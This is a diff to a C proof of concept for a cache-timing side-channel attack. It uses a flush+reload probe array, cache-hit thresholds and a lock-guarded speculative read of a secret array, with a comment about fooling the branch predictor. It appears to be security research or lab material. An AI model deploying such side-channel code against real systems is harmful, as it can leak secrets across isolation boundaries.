@@ -8,7 +8,7 @@
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 1
+#define REPETITIONS 10
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
 #define SECRET_SIZE 8
@@ -20,18 +20,18 @@
 
 cp_t* flush_reload_arr;
 
-void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
+extern inline void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
     pthread_mutex_lock(lock_ptr);
     volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
 }
 
 void victim_func(int lock_index, int secret_index) {
 
+    //creates 3 locks. put addresses in array to prevent branches (fools branch predictor).
     pthread_mutex_t k, l, m;
     pthread_mutex_init(&k, NULL);
     pthread_mutex_init(&l, NULL);
     pthread_mutex_init(&m, NULL);
-
     int  k_idx = 0;
     int  l_idx = 1;
     int  m_idx = 2;
@@ -63,9 +63,13 @@ void victim_func(int lock_index, int secret_index) {
 
     cpuid();
 
-    if(!locked[k_idx]) pthread_mutex_unlock(&k);
+    pthread_mutex_unlock(klm_address);
+    pthread_mutex_destroy(&k);
+    pthread_mutex_destroy(&l);
+    pthread_mutex_destroy(&m);
+    /*if(!locked[k_idx]) pthread_mutex_unlock(&k);
     if(!locked[l_idx]) pthread_mutex_unlock(&l);
-    if(!locked[m_idx]) pthread_mutex_unlock(&m);
+    if(!locked[m_idx]) pthread_mutex_unlock(&m);*/
 
 }
 
